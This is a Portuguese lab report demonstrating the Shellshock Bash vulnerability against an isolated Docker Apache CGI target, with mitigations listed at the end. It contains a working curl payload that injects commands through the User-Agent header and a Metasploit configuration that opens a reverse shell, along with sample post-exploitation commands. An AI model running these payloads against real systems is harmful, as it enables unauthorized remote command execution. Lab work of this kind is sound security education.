# Relatorio - Exploit Shellshock com Metasploit

## 1. Introducao

Este trabalho demonstra a exploracao da vulnerabilidade Shellshock
(CVE-2014-6271) em um ambiente controlado com Docker. O alvo e um servidor
Apache executando um script CGI interpretado por uma versao vulneravel do Bash.
O atacante utiliza o Metasploit Framework para enviar um cabecalho HTTP
malicioso e obter execucao remota de comandos.

## 2. Padrao de ataque

O ataque explora a forma como versoes vulneraveis do Bash importam variaveis de
ambiente. Quando uma variavel contem uma definicao de funcao seguida por
comandos extras, o Bash interpreta indevidamente os comandos ao inicializar.

Padrao simplificado:

```text
() { :;}; comando_malicioso
```

Em servidores CGI, cabecalhos HTTP como `User-Agent`, `Cookie` e `Referer` sao
convertidos em variaveis de ambiente, por exemplo `HTTP_USER_AGENT`. Se o script
CGI for executado por um Bash vulneravel, o conteudo do cabecalho pode ser
executado como comando no servidor.

## 3. Ambiente controlado

- Atacante: container local `metasploit-attacker:local`, baseado na imagem
  `metasploitframework/metasploit-framework`.
- Vitima: container local `shellshock-victim:local`.
- Rede isolada: `pentest_net`, subnet `172.28.0.0/24`, marcada como `internal`.
- IP do atacante: `172.28.0.10`.
- IP da vitima: `172.28.0.20`.

## 4. Vulnerabilidade explorada

- CVE: CVE-2014-6271.
- Software afetado: GNU Bash sem o patch de setembro de 2014.
- Servico exposto: Apache CGI em `/cgi-bin/status.cgi`.
- Impacto: execucao remota de comandos com os privilegios do processo web.

## 5. Roteiro de implementacao do ataque

1. Construir e subir o laboratorio:

```bash
docker compose up --build
```

Saida observada:

```text
[+] up 4/4
Image shellshock-victim:local   Built
Image metasploit-attacker:local Built
Container attacker              Recreated
Container victim                Recreated
Attaching to attacker, victim
```

Durante a inicializacao da vitima, o Apache exibiu o aviso abaixo. Ele nao
impede a execucao do laboratorio:

```text
apache2: Could not reliably determine the server's fully qualified domain name,
using 172.28.0.20. Set the 'ServerName' directive globally to suppress this
message
```

2. Verificar se a vitima responde:

```bash
docker exec -it attacker curl http://172.28.0.20/cgi-bin/status.cgi
```

Saida observada:

```text
Shellshock lab victim
CGI script executed as: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Server time: Mon Jun 15 17:05:15 UTC 2026
```

Essa resposta confirma que o endpoint CGI estava acessivel e que o script era
executado com o usuario `www-data`, usuario padrao do processo web.

3. Testar a vulnerabilidade manualmente:

```bash
docker exec -it attacker curl -H 'User-Agent: () { :;}; /bin/touch /tmp/shellshock-proof' http://172.28.0.20/cgi-bin/status.cgi
docker exec -it victim ls -l /tmp/shellshock-proof
```

Saida observada na requisicao maliciosa:

```text
500 Internal Server Error
```

Saida observada na verificacao do arquivo:

```text
-rw-r--r-- 1 www-data www-data 0 Jun 15 17:05 /tmp/shellshock-proof
```

Mesmo com a resposta `500 Internal Server Error`, a vulnerabilidade foi
confirmada porque o arquivo `/tmp/shellshock-proof` foi criado com dono
`www-data`. Isso mostra que o comando injetado no cabecalho HTTP foi executado
no servidor.

4. Executar o exploit via Metasploit:

```bash
docker exec -it attacker /usr/src/metasploit-framework/msfconsole -r /workspace/metasploit/shellshock.rc
```

Saida observada:

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 172.28.0.20
set RPORT 80
set TARGETURI /cgi-bin/status.cgi
set TARGET 0
set PAYLOAD generic/shell_reverse_tcp
set LHOST 172.28.0.10
set LPORT 4444
check
[+] 172.28.0.20:80 - The target is vulnerable.
run
[*] Started reverse TCP handler on 172.28.0.10:4444
[*] Command Stager progress - 100.00% done (817/817 bytes)
[*] Command shell session 1 opened (172.28.0.10:4444 -> 172.28.0.20:40536)
```

O trecho `The target is vulnerable` confirma que o modulo identificou a falha
no alvo. O trecho `Command shell session 1 opened` confirma que o payload abriu
uma sessao de shell reverso entre a vitima e o atacante.

5. Demonstrar comandos na sessao obtida:

```bash
sessions -i 1
id
hostname
pwd
cat /etc/os-release
```

## 6. Modulo e payload utilizados

- Modulo: `exploit/multi/http/apache_mod_cgi_bash_env_exec`.
- Payload: `generic/shell_reverse_tcp`.
- `RHOSTS`: `172.28.0.20`.
- `TARGETURI`: `/cgi-bin/status.cgi`.
- `LHOST`: `172.28.0.10`.
- `LPORT`: `4444`.

## 7. Analise dos pacotes modificados

O pacote HTTP malicioso altera o valor de um cabecalho comum, como
`User-Agent`. Em uma requisicao normal, esse campo apenas identifica o cliente.
No ataque, o campo passa a conter a assinatura da vulnerabilidade:

```text
User-Agent: () { :;}; comando
```

O Apache recebe a requisicao, transforma o cabecalho em variavel de ambiente e
executa o script CGI. O Bash vulneravel interpreta a variavel antes do script e
executa o comando injetado.

## 8. Defesas e mitigacoes

- Atualizar o Bash para uma versao corrigida.
- Remover ou desabilitar CGI quando nao for necessario.
- Executar servicos web com usuario de baixo privilegio.
- Aplicar filtragem de cabecalhos suspeitos em WAF ou reverse proxy.
- Restringir trafego de saida do servidor para dificultar shells reversos.
- Usar segmentacao de rede e monitoramento de logs HTTP.
- Aplicar hardening com AppArmor, SELinux ou perfis seccomp em containers.

## 9. Ferramentas complementares

- Docker: criacao do ambiente controlado.
- Apache CGI: superficie vulneravel.
- curl: validacao manual da vulnerabilidade.
- Metasploit Framework: execucao do exploit e payload.

## 10. Roteiro do video

1. Explicar Shellshock e o papel das variaveis de ambiente no Bash.
2. Mostrar o ambiente Docker e os IPs da rede isolada.
3. Acessar o CGI normalmente.
4. Demonstrar a execucao manual com `curl`.
5. Executar o modulo do Metasploit.
6. Mostrar comandos executados na sessao obtida.
7. Explicar mitigacoes e defesas complementares.
